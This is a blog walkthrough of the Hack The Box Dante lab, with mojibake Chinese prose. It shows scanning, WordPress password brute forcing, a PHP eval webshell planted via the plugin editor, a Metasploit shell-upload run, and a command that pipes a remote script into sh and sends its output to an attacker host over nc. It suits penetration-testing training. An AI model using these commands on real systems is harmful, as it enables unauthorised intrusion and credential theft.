<!DOCTYPE html><html lang="en">
  <head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>HTB Prolab Dante walkthrough - DumKiy's blog</title>

<meta name="description" content="ä¿¡æ¯æ”¶é›†fscanâ””â”€$ fscan -h 10.10.110.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |...">
<link rel="canonical" href="/pentest/2024/01/02/HTB-Prolab-Dante.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->

<!-- end custom head snippets -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
        jquery: '/assets/js/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: '/assets/js/Chart.bundle.min.js',
        gitalk: {
          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
        },
        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: '/assets/js/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3,h4'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root">
<div class="page__main js-page-main page__viewport has-aside cell cell--auto">

      <div class="page__main-inner">
<div class="page__header d-print-none">
<header class="header"><div class="main">
      <div class="header__title">
        <div class="header__brand">
<?xml version="1.0" standalone="no"?>

<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="512.000000pt" height="512.000000pt" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet">
<metadata>
Created by potrace 1.14, written by Peter Selinger 2001-2017
</metadata>
<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
684 10 1799 11 l1755 0 57 -23z"></path>
<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
918 -31 16 -53 17 -87 3z"></path>
<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"></path>
</g>
</svg>
<a title="Watch And Learn
" href="/">DumKiy's blog</a>
</div>
<button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button>
</div>
<nav class="navigation">
        <ul>
<li class="navigation__item"><a href="/docs/en/quick-start">Docs</a></li>
<li class="navigation__item"><a href="/">Home</a></li>
<li class="navigation__item"><a href="/categories.html">Categories</a></li>
<li class="navigation__item"><a href="/tags.html">Tags</a></li>
<li class="navigation__item"><a href="/about.html">About</a></li>
<li class="navigation__item"><a href="/Resources.html">Resources</a></li>
<li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li>
<li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li>
</ul>
      </nav>
</div>
  </header>
</div>
<div class="page__content"><div class="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto">
<!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>HTB Prolab Dante walkthrough</h1></header></div>
<meta itemprop="headline" content="HTB Prolab Dante walkthrough">
<div class="article__info clearfix">
      <div class="right-col">
         <ul class="menu"> <span style="font-size: 1.2em;">ğŸ“‚</span><li>
              <a class="button button--secondary button--pill button--sm" href="/categories.html?tag=Pentest">Pentest</a>
            </li>
</ul>
      </div>
      <div class="right-col"><ul class="left-col menu"> <span style="font-size: 1.2em;">ğŸ“Œ</span><li>
              <a class="button button--secondary button--pill button--sm" href="/tags.html?tag=HTB">HTB</a>
            </li>
<li>
              <a class="button button--secondary button--pill button--sm" href="/tags.html?tag=MS17-010">MS17-010</a>
            </li>
<li>
              <a class="button button--secondary button--pill button--sm" href="/tags.html?tag=LPE">LPE</a>
            </li>
</ul></div>
<ul class="left-col menu"><li>
<i class="far fa-calendar-alt"></i> <span>Jan 02, 2024</span>
            </li></ul>
</div>
<meta itemprop="author" content="DumKiy">
<meta itemprop="datePublished" content="2024-01-02T18:29:48+08:00">
    <meta itemprop="keywords" content="HTB,MS17-010,LPE">
<div class="js-article-content">
<div class="layout--article">
<!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody">
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074246.png" alt="20240102074246">
<!-- ![Alt text](../../../../../assets/image-12.png) --></p>

<h1 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h1>
<h2 id="fscan">fscan</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â””â”€<span class="nv">$ </span>fscan <span class="nt">-h</span> 10.10.110.0/24

   ___                              _    
  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___| | __ 
 / /_<span class="se">\/</span>____/ __|/ __| <span class="s1">'__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.10.110.2     is alive
(icmp) Target 10.10.110.100   is alive
[*] Icmp alive hosts len is: 2
10.10.110.100:21 open
10.10.110.100:22 open
[*] alive ports len is: 2
start vulscan
[+] ftp://10.10.110.100:21:anonymous 
</span></code></pre></div></div>
<p>å­˜æ´»ä¸»æœºï¼š</p>
<ul>
  <li>10.10.110.2</li>
  <li>10.10.110.100</li>
</ul>

<p>ftp://10.10.110.100:21 å…è®¸åŒ¿åç™»é™†ã€‚</p>

<p>å¯¹ 10.10.110.100 è¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œæ³¨æ„éœ€è¦åŠ ä¸Š sudoï¼Œ</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-T4</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 10.10.110.100
</code></pre></div></div>
<p>nmap æ‰«æç»“æœä¸­æœ‰ä¸€ä¸ª flagï¼Œ65000 å¼€æ”¾äº†ä¸€ä¸ª apache2ï¼Œä¸Šé¢è¿è¡Œäº†ä¸€ä¸ª wordpress æœåŠ¡ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_Can<span class="s1">'t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></code></pre></div></div>
<h2 id="ftp-åŒ¿åç™»é™†">ftp åŒ¿åç™»é™†</h2>
<p>ftp å…è®¸åŒ¿åç™»é™†ï¼Œä¸€å¼€å§‹ä¼šå‡ºç°ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>229 Entering Extended Passive Mode <span class="o">(||</span>|58413|<span class="o">)</span>
</code></pre></div></div>
<p>ç­‰å¾…ä¸€æ®µæ—¶é—´åå¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤ã€‚Transfer/Incoming ä¸­æœ‰ä¸€ä¸ª todo.txt</p>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James<span class="s1">' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
</span></code></pre></div></div>

<h2 id="wordpress-åå°-getshell">wordpress åå° getshell</h2>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074942.png" alt="20240102074942"></p>

<!-- ![Alt text](../../../../../assets/image-1.png) -->

<p>ä½¿ç”¨ wpscan æ‰«æã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.110.100:65000/wordpress <span class="nt">--enumerate</span>
</code></pre></div></div>
<p>ç‰ˆæœ¬ä¸º WordPress version 5.4.1ï¼Œæ²¡æœ‰æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„æ’ä»¶ï¼Œå­˜åœ¨ç”¨æˆ· admin å’Œ jamesã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] URL: http://10.10.110.100:65000/wordpress/ <span class="o">[</span>10.10.110.100]
<span class="o">[</span>+] Started: Fri Dec 22 22:12:24 2023

Interesting Finding<span class="o">(</span>s<span class="o">)</span>:

<span class="o">[</span>+] Headers
 | Interesting Entry: Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
 | Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

<span class="o">[</span>+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

<span class="o">[</span>+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

<span class="o">[</span>+] WordPress version 5.4.1 identified <span class="o">(</span>Insecure, released on 2020-04-29<span class="o">)</span><span class="nb">.</span>
 | Found By: Atom Generator <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.110.100:65000/wordpress/?feed<span class="o">=</span>atom, &lt;generator <span class="nv">uri</span><span class="o">=</span><span class="s2">"https://wordpress.org/"</span> <span class="nv">version</span><span class="o">=</span><span class="s2">"5.4.1"</span><span class="o">&gt;</span>WordPress&lt;/generator&gt;
 | Confirmed By: Style Etag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.110.100:65000/wordpress/wp-admin/load-styles.php, Match: <span class="s1">'5.4.1'</span>

<span class="o">[</span>i] The main theme could not be detected.

<span class="o">[</span>+] Enumerating Vulnerable Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>

<span class="o">[</span>i] No plugins Found.

<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] admin
 | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By:
 |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] james
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.
<span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</code></pre></div></div>

<p>todo.txt ä¸­æŒ‡å‡º james çš„å¯†ç ä¸å¤ªå®‰å…¨ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´ james çš„å¯†ç ã€‚å­—å…¸å¯ä»¥ä½¿ç”¨ rockyou.txtï¼Œä½†å¾ˆä¹…éƒ½æ²¡çˆ†å‡ºæ¥ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.110.100:65000/wordpress <span class="nt">-U</span> james <span class="nt">-P</span> /webtools/dicts/rockyou.txt <span class="nt">--proxy</span> http://127.0.0.1:8080
</code></pre></div></div>
<p>å‚è€ƒ Tamarisk çš„ writeupï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨é¡µé¢çš„å†…å®¹æˆ–è€…å…¶ä»–æ•æ„Ÿå†…å®¹ç”Ÿæˆå­—å…¸ï¼Œå®åœ¨çˆ†ç ´ä¸å‡ºæ¥æ—¶å¯ä»¥è€ƒè™‘è¿™ç§æ–¹æ³•ã€‚cewl æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆè‡ªå®šä¹‰å•è¯åˆ—è¡¨çš„å·¥å…·,å¯ä»¥çˆ¬å–æŒ‡å®š URL çš„ç½‘é¡µå†…å®¹ï¼Œè¿”å›ä¸€ä¸ªå•è¯åˆ—è¡¨ï¼Œç”¨ç”Ÿæˆçš„å­—å…¸çˆ†ç ´ä¹‹åå¯ä»¥å¾—åˆ°å¯†ç  Toyotaã€‚è¯¥å¯†ç ä¹Ÿåœ¨ rockyou.txt ï¼Œä½†è¡¨å•çš„çˆ†ç ´ç¡®å®æ¯”è¾ƒæ…¢ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks <span class="o">&gt;</span> words.txt
</code></pre></div></div>
<p>ä»¥ james ç”¨æˆ·è¿›å…¥åå°åï¼Œjames æ­£å¥½å±äº Administratorã€‚Wordpress åå° getshell çš„ç›¸å…³åˆ©ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒï¼š<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#plugin-rce">Wordpress - HackTricks</a>ï¼Œä¸»è¦æœ‰ä»¥ä¸‹çš„å‡ ç§æ–¹æ³•ï¼š</p>
<ol>
  <li>ä¿®æ”¹ä¸»é¢˜æ¨¡æ¿ã€‚</li>
  <li>ä¿®æ”¹æ’ä»¶æ–‡ä»¶ã€‚</li>
  <li>ä¸Šä¼ æ’ä»¶ã€‚</li>
</ol>

<p>è®¿é—® /wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwenty ä¿®æ”¹ 404.phpã€‚æ·»åŠ ä¸€å¥è¯ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"pass"</span><span class="p">]);</span>
</code></pre></div></div>
<p>ä½†ä¿å­˜æ—¶å¾—åˆ°<code class="language-plaintext highlighter-rouge">Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.</code> çš„é”™è¯¯ï¼Œè¯¥æŠ¥é”™æ˜¯ Wordpress 4.9 ä¹‹åæ·»åŠ çš„åŠŸèƒ½ï¼Œä¼šåœ¨ WP æ–‡ä»¶ç¼–è¾‘å™¨ä¸­æ— æ³•ä¿®æ”¹ php æ–‡ä»¶ã€‚</p>

<p>ä½¿ç”¨ Plugin Editor ä¿®æ”¹æ’ä»¶æ–‡ä»¶æ—¶å¯ä»¥æ­£å¸¸ä¿å­˜ï¼Œä¾‹å¦‚ä¿®æ”¹ akismet/class.akismet-cli.phpã€‚ä¿®æ”¹åè®¿é—®ï¼š/wordpress/wp-content/plugins/akismet/class.akismet-cli.php å³å¯ã€‚</p>

<p>MSF ä¸­ä¹Ÿé›†æˆäº†ç›¸å…³ expï¼Œä½†å¥½åƒæ²¡æ³•æ­£å¸¸ä¸Šä¼  payloadã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 10.10.14.5
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 3333
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD Toyota
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USERNAME james
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>targeturi /wordpress
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.10.110.100
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rport 65000
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using james:Toyota...
<span class="o">[</span>+] Authenticated with WordPress
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wordpress/wp-content/plugins/bpjosOzqKn/skfipPVLfx.php...
<span class="o">[!]</span> This exploit may require manual cleanup of <span class="s1">'skfipPVLfx.php'</span> on the target
<span class="o">[!]</span> This exploit may require manual cleanup of <span class="s1">'bpjosOzqKn.php'</span> on the target
<span class="o">[!]</span> This exploit may require manual cleanup of <span class="s1">'../bpjosOzqKn'</span> on the target
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.
</code></pre></div></div>

<p>è·å–åˆ° webshell ä¹‹åå¼€å§‹æœ¬åœ°ç¯å¢ƒçš„ä¿¡æ¯æ”¶é›†ã€‚</p>
<ul>
  <li>å†…ç½‘ ip 172.16.1.100, ç½‘å…³ 172.16.1.1ï¼Œå…¶ä»–ä¸»æœº 172.16.1.20</li>
  <li>æœ¬åœ°å­˜åœ¨ mysql æœåŠ¡ã€‚å¯ä»¥åœ¨ wp-config ä¸­æ‹¿åˆ°ç”¨æˆ·åå¯†ç ï¼šshaun/passwordï¼Œä½†æ•°æ®åº“ä¸­ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚
    <div class="language-php highlighter-rouge">
<div class="highlight"><pre class="highlight"><code>      <span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

      <span class="cd">/** MySQL database username */</span>
      <span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'shaun'</span> <span class="p">);</span>

      <span class="cd">/** MySQL database password */</span>
      <span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'password'</span> <span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>james ç”¨æˆ·ç›®å½•ä¸‹æœ‰ä¸€ä¸ª flag.txtï¼Œä½†ä»…èƒ½å¤Ÿä»¥ james ç”¨æˆ·çš„èº«ä»½è¯»å–ã€‚å¯ä»¥æƒ³åŠæ³•è·å– james ç”¨æˆ·çš„å¯†ç ï¼Œæˆ–è€…ææƒåˆ° root ååœ¨åˆ‡æ¢åˆ° james ç”¨æˆ·ã€‚</li>
</ul>

<h2 id="linux-ææƒ">linux ææƒ</h2>
<p>å…¨é¢æ”¶é›†ä¿¡æ¯å¯ä»¥ä½¿ç”¨ linPEAS æˆ–è€… lse</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># linPEAS</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>linpeas.out <span class="c">#Host</span>
curl 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 <span class="c">#Victim</span>

<span class="c"># lse</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>lse.out <span class="c">#Host</span>

